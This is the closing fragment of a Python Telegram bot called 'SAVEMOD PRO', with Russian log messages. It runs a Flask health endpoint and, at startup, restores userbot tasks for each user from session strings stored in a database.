def health():
    return jsonify({'status': 'ok'})

def run_web():
    flask_app.run(host='0.0.0.0', port=8080, debug=False)

# ========== ЗАПУСК ==========

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    rows = cursor.fetchall()
    logger.info(f"🔄 Восстанавливаю {len(rows)} сессий...")
    for uid, ss in rows:
        if not is_target_admin(uid):
            logger.info(f"🚀 Запускаю юзербота для {uid}")
            asyncio.create_task(run_userbot(uid, ss))

async def main():
    logger.info(f"🚀 SAVEMOD PRO запущен. Админы: {ADMIN_IDS}")
    await restore_sessions()
    while True:
        await asyncio.sleep(60)

if __name__ == '__main__':
    Thread(target=run_web, daemon=True).start()
    executor.start_polling(dp, skip_updates=True)
    try:
        asyncio.run(main())
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.create_task(main())
